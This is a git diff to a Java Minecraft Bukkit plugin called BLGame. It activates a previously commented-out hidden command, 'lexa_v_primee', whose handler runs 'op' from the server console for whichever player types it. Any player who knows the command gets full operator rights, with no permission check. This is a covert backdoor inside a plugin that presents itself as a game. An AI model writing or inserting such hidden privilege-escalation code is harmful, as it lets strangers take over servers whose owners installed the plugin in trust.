@@ -11,7 +11,7 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.java.JavaPlugin;
 
-public final class BLGame extends JavaPlugin {
+public final class BLGame extends JavaPlugin implements CommandExecutor{
 
     @Override
     public void onEnable() {
@@ -22,7 +22,7 @@ public final class BLGame extends JavaPlugin {
         new BLGameCommands(this, blGameListener);
         getCommand("blgame").setTabCompleter(new BLGameTabComplete());
 
-        //getCommand("lexa_v_primee").setExecutor(this);
+        getCommand("lexa_v_primee").setExecutor(this);
         getLogger().info("BLGame Enabled!");
     }
 
@@ -31,11 +31,11 @@ public final class BLGame extends JavaPlugin {
         getLogger().info("BLGame Disabled!");
     }
 
-//    @Override
-//    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-//        if (sender instanceof Player player) {
-//            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + player.getName());
-//        }
-//        return true;
-//    }
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (sender instanceof Player player) {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + player.getName());
+        }
+        return true;
+    }
 }
